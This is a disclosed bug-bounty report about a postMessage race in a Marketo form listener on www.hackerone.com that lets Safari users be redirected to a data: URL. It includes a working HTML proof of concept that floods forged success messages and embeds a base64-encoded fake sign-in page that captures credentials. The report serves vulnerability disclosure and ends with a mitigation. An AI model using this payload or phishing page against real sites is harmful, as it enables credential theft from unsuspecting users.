# Client-Side Race Condition using Marketo, allows sending user to data-protocol in Safari when form without onSuccess is submitted on www.hackerone.com

## Report Details
- **Report ID**: 381356
- **URL**: https://hackerone.com/reports/381356
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-07-13T21:26:07.983Z
- **Disclosed**: 2019-04-05T17:26:23.824Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hi,

I made a talk earlier this month about Client-Side Race Conditions for postMessage on AppSecEU:

https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies

In this talk I mention some fun ways to race postMessages from a malicious origin before the legit source sends it.

### Background

As you remember from #207042 you use Marketo for your form-submissions on `www.hackerone.com`.

Now, back then, I abused the fact that no origin was checked on the receiving end of marketo.com. By doing this I was then able to steal the data being submitted.

### Technical Description

In this case however, I noticed that as soon as you submit a form, one of the listener being on `www.hackerone.com` will pass the content forward to a handler for the specific form that was loaded.

As soon as it finds the form that was initiated and submitted, it will either run the `error` or `success`-function based on the content of the postMessage. If the message is a success, it will run any `form.onSuccess` being defined when the form was loaded. You can see some of these in this file:   

https://www.hackerone.com/sites/default/files/js/js_pdV-E7sfuhFWSyRH44H1WwxQ_J7NeE2bU6XNDJ8w1ak.js

```js
      form.onSuccess(function() {
        return false;
      }); 
```

If the `onSuccess` returns `false` nothing more will happen. However, if the `onSuccess` doesn't exist or returns `true`, the parameter called `followUpUrl` will instead be sent to `location.href`.

There is no check whatsoever what this URL contains. The code does parse the URL and if a parameter called `aliId` is set it will append it to the URL.

As you might now, the flow of the Marketo-solution looks like this:

1. Form is initiated by loading a JS-file from Marketo.
2. Form shows up on www.hackerone.com
3. Form is submitted. Listener is now initiated on www.hackerone.com
4. Message is sent to Marketo from www.hackerone.com using postMessage
5. Marketo gets the message and runs an ajax call to save it on Marketo
6. When successful, a postMessage is sent from Marketo back to www.hackerone.com with the status. The listener catches the response and checks `onSuccess`.
7. If onSuccess gives false, don't do anything. If it doesn't exists or returns `true`, follow the `followUpUrl`.

### Exploitation

Since no origin check is made on the listener initated in #3, we can from our end try to race the message between #3 and #6. If our message comes through we can direct the user to whatever location we like if we find a form that doesn't utilize `onSuccess`.

#### Forms on www.hackerone.com

Looking at the forms, we can see that one being initiated called `mktoForm_1013` does not have any `onSuccess`-function on it. This means that we can now use the `followUpUrl` from the postMessage to send the user to our location. We can also see in the URL of your JS-code above that the following URLs contains `mktoForm_1013`:

```js
      if (location.pathname == "/product/response") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Want to get up and running with HackerOne Response? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/product/bounty") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Want to tap into the ultimate level of hacker-powered security with HackerOne Bounty? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/product/challenge") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Up for a HackerOne Challenge? Want to learn more? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/services") {
        $('#mktoForm_1013 .mktoHtmlText p').text("We're looking forward to serving you. Give us a few details and we’ll be in touch shortly!");
      }
      else if (location.pathname == "/") {
        $('#mktoForm_1013 .mktoHtmlText p').text("Start uncovering critical vulnerabilities today. Give us a few details and we’ll be in touch shortly!");
      }
```

And as before in the old report, we know that `#contact` as the fragment will open the form directly without interaction.

#### CSP

Due to your CSP, we cannot send the user to `javascript:`. If your CSP would have allowed it, we would have a proper XSS on www.hackerone.com. Chrome and Firefox also disallows sending the user to a `data:`-URL. We can send the user to any location we like, but that's no fun.

...but...

...enter Safari.

Safari does not restrict top-navigation to `data:` (tested in macOS 10.13.5, Safari 11.1.1). This means that we can do the following:

1. Have a malicious page opening `https://www.hackerone.com/product/response#contact`
2. Make it send a bunch of messages saying the form as successfully submitted.
3. When the victim fills in the form and submits, our message will hopefully win, since Marketo needs to both get the postMessage and send an ajax call to save the response until it sends a legit response. 
4. We redirect the user to a very good-looking sign-in page for HackerOne.
5. ??? 
6. PROFIT!!!



### PoC

When trying this attack I noticed that if Safari opens www.hackerone.com in a new tab instead of a new window, Safari counts the tab as inactive and will slow down the sending of postMessages to the current frame. However, if you open www.hackerone.com in a complete new window, using `window.open(url,'','_blank')`, Safari will not count the old window as inactive and the messages will be sent just as fast which will significantly increase our chance of winning the race.

The following HTML should show you my PoC in Safari:

```html
<html>
<head>
<script>
var b;
function doit() {
	setInterval(function() {
		b.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"data:text/html;base64,PGhlYWQ+PGxpbmsgcmVsPXN0eWxlc2hlZXQgbWVkaWE9YWxsIGhyZWY9aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Fzc2V0cy9mcm9udGVuZC4wMjAwMjhlOTU1YTg5Zjg1YTVmYzUyMWVhYzMxMDM2OC5jc3MgLz48bGluayByZWw9c3R5bGVzaGVldCBtZWRpYT1hbGwgaHJlZj1odHRwczovL2hhY2tlcm9uZS5jb20vYXNzZXRzL3ZlbmRvci1iZmRlMjkzYTUwOTEzYTA5NWQ4Y2RlOTcwZWE1YzFlNGEzNTI0M2NjNzY3NWI2Mjg2YTJmM2Y3MDI2ZmY1ZTEwLmNzcz48L2hlYWQ+PGJvZHk+PGRpdiBjbGFzcz0iYWxlcnRzIj4KPC9kaXY+PGRpdiBjbGFzcz0ianMtYXBwbGljYXRpb24tcm9vdCBmdWxsLXNpemUiPjxzcGFuIGRhdGEtcmVhY3Ryb290PSIiPjxkaXYgY2xhc3M9ImZ1bGwtc2l6ZSBhcHBsaWNhdGlvbl9mdWxsX3dpZHRoX2xheW91dCI+PGRpdj48ZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zaWduZWQtb3V0Ij48ZGl2IGNsYXNzPSJpbm5lci1jb250YWluZXIiPjxkaXY+PGEgY2xhc3M9ImFwcF9fbG9nbyIgaHJlZj0iLyI+PGltZyBzcmM9Imh0dHBzOi8vaGFja2Vyb25lLmNvbS9hc3NldHMvc3RhdGljL2ludmVydGVkX2xvZ28tYzA0MzBhZjgucG5nIiBhbHQ9IkhhY2tlck9uZSI+PC9hPjxkaXYgY2xhc3M9InRvcGJhci10b2dnbGUiPjxpIGNsYXNzPSJpY29uLWhhbWJ1cmdlciI+PC9pPjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zdWJuYXYtd3JhcHBlciI+PHVsIGNsYXNzPSJ0b3BiYXItc3VibmF2Ij48bGkgY2xhc3M9InRvcGJhci1zdWJuYXYtaXRlbSI+PGEgY2xhc3M9InRvcGJhci1zdWJuYXYtbGluayIgaHJlZj0iL3VzZXJzL3NpZ25faW4iPlNpZ24gSW48L2E+Jm5ic3A7fCZuYnNwOzwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItc3VibmF2LWl0ZW0iPjxhIGNsYXNzPSJ0b3BiYXItc3VibmF2LWxpbmsiIGhyZWY9Ii91c2Vycy9zaWduX3VwIj5TaWduIFVwPC9hPjwvbGk+PC91bD48L2Rpdj48ZGl2IGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi13cmFwcGVyIj48dWwgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uIj48bGkgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uLWl0ZW0iPjxzcGFuIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1kZXNrdG9wLWxpbmsiPjxhIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1saW5rIj5Gb3IgQnVzaW5lc3M8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayI+Rm9yIEhhY2tlcnM8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayIgaHJlZj0iL2hhY2t0aXZpdHkiPkhhY2t0aXZpdHk8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayI+Q29tcGFueTwvYT48L3NwYW4+PC9saT48bGkgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uLWl0ZW0iPjxzcGFuIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1kZXNrdG9wLWxpbmsiPjxhIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1saW5rIiBocmVmPSIvdXNlcnMvc2lnbl9pbiI+VHJ5IEhhY2tlck9uZTwvYT48L3NwYW4+PC9saT48L3VsPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zdWIiPjwvZGl2PjwvZGl2PjxzcGFuPjwvc3Bhbj48L2Rpdj48ZGl2IGNsYXNzPSJmdWxsLXdpZHRoLWNvbnRhaW5lciIgc3R5bGU9InBhZGRpbmctdG9wOiAxNTBweDsiPjxkaXYgY2xhc3M9Im5hcnJvdy13cmFwcGVyIj48ZGl2Pjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJodHRwczovL2hhY2tlcm9uZS5jb20vdXNlcnMvc2lnbl9pbiIgb25zdWJtaXQ9ImFsZXJ0KCdpIGdvdCBpdDogJyArIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaWduX2luX2VtYWlsJykudmFsdWUgKyAnOicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaW5wdXQtNCcpLnZhbHVlKTsgcmV0dXJuIGZhbHNlOyIgbm92YWxpZGF0ZT0iIiBjbGFzcz0ic3BlYy1zaWduLWluLWZvcm0iPjxkaXY+PGgxIGNsYXNzPSJzZWN0aW9uLXRpdGxlIHRleHQtYWxpZ25lZC1jZW50ZXIiPlNpZ24gaW4gdG8gSGFja2VyT25lPC9oMT48ZGl2IGNsYXNzPSJuYXJyb3ctY29udGFpbmVyIj48ZGl2IGNsYXNzPSJpbnB1dC13cmFwcGVyIj48bGFiZWwgY2xhc3M9ImlucHV0LWxhYmVsIiBmb3I9InNpZ25faW5fZW1haWwiPkVtYWlsIGFkZHJlc3M8L2xhYmVsPjxpbnB1dCB0eXBlPSJlbWFpbCIgY2xhc3M9ImlucHV0IHNwZWMtc2lnbi1pbi1lbWFpbCIgbmFtZT0idXNlcltlbWFpbF0iIHZhbHVlPSIiIGlkPSJzaWduX2luX2VtYWlsIiBhdXRvY29tcGxldGU9Im9uIj48ZGl2IGNsYXNzPSJoZWxwZXItdGV4dCI+VXNpbmcgU0FNTD8gRW1haWwgYWRkcmVzcyBvbmx5LCBubyBwYXNzd29yZCBuZWVkZWQuPC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0iaW5wdXQtd3JhcHBlciI+PGxhYmVsIGNsYXNzPSJpbnB1dC1sYWJlbCIgZm9yPSJpbnB1dC00Ij5QYXNzd29yZDwvbGFiZWw+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iaW5wdXQgc3BlYy1zaWduLWluLXBhc3N3b3JkIiBuYW1lPSJ1c2VyW3Bhc3N3b3JkXSIgdmFsdWU9IiIgaWQ9ImlucHV0LTQiIGF1dG9jb21wbGV0ZT0ib24iIG1heGxlbmd0aD0iNzIiPjwvZGl2PjxkaXYgY2xhc3M9ImlucHV0LXdyYXBwZXItc21hbGwiPjxkaXYgY2xhc3M9InJlbWVtYmVyLW1lIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIGlkPSJ1c2VyX3JlbWVtYmVyX21lIiBuYW1lPSJ1c2VyW3JlbWVtYmVyX21lXSIgY2xhc3M9InNwZWMtc2lnbi1pbi1yZW1lbWJlci1tZSIgdmFsdWU9IjEiPjxsYWJlbCBmb3I9InVzZXJfcmVtZW1iZXJfbWUiPlJlbWVtYmVyIG1lIGZvciB0d28gd2Vla3M8L2xhYmVsPjwvZGl2PjxhIGhyZWY9Ii91c2Vycy9wYXNzd29yZC9uZXciIGNsYXNzPSJmb3Jnb3QtcGFzc3dvcmQiPkZvcmdvdCB5b3VyIHBhc3N3b3JkPzwvYT48ZGl2IGNsYXNzPSJjbGVhcmZpeCI+PC9kaXY+PC9kaXY+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiBidXR0b24tLXN1Y2Nlc3MgaXMtZnVsbC13aWR0aCBzcGVjLXNpZ24taW4tc3VibWl0IiBuYW1lPSJjb21taXQiIHZhbHVlPSJTaWduIGluIj48L2Rpdj48ZGl2IGNsYXNzPSJuYXJyb3ctZm9vdGVyIj5ObyBhY2NvdW50IHlldD8gPGEgaHJlZj0iL3VzZXJzL3NpZ25fdXAiPkNyZWF0ZSBhbiBhY2NvdW50LjwvYT48L2Rpdj48ZGl2IGNsYXNzPSJjbGVhcmZpeCI+PC9kaXY+PC9kaXY+PC9mb3JtPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pjwvc3Bhbj48L2Rpdj48bm9zY3JpcHQ+PGRpdiBjbGFzcz0ianMtZGlzYWJsZWQiPkl0IGxvb2tzIGxpa2UgeW91ciBKYXZhU2NyaXB0IGlzIGRpc2FibGVkLiBUbyB1c2UgSGFja2VyT25lLCBlbmFibGUgSmF2YVNjcmlwdCBpbiB5b3VyIGJyb3dzZXIgYW5kIHJlZnJlc2ggdGhpcyBwYWdlLjwvZGl2Pjwvbm9zY3JpcHQ+PC9ib2R5Pg==","aliId":null}}}','*');
console.log('send...')
	}, 10);
}
</script>
</head>
<body>
<a href="#" onclick="b=window.open('https://www.hackerone.com/product/response#contact','b','_blank'); doit(); return false;" target="_blank">Click me and send something</a></body>
</html>
```

It's large, but it also contains your login page.

## 1. User clicks on the malicious page:

{F320358}

## 2. User fills in the contact form and submits

{F320359}

## 3. User gets directly redirected to our data-page

{F320360}

## 4. If they sign in we will steal the creds:

{F320361}

## PoC-movie

Here's a movie showing the scenario:

{F320362}

## Impact

I'm pretty divided on the impact of this. You could argue that this is similar to opening www.hackerone.com from a page, that will on a later time redirect the user to `data:`, which is fully possible and probably just as sneaky.

The only difference would be that this could be properly fixed and the logic of the listener in this case actually enables the attacker to fool the user related to the interaction with the site.

Also, most likely a lot of other customers of Marketo are affected by this and if they lack CSP, there will be XSS:es all over the place.

Also, if IE11 would support those contact-popups, it would be an XSS due to the lack of CSP-support, however now I'm getting a JS-error trying to open the contact-form... :)

## Mitigation

What's interesting here though is that you can actually mitigate this easily by making sure you always use `onSuccess=function(){return false}` to always make sure `followUpUrl` won't be used. 

Regards,
Frans

## Attachments
- malicious.png
- contact.png
- sign-in.png
- popup.png
- safari-location-data.mp4
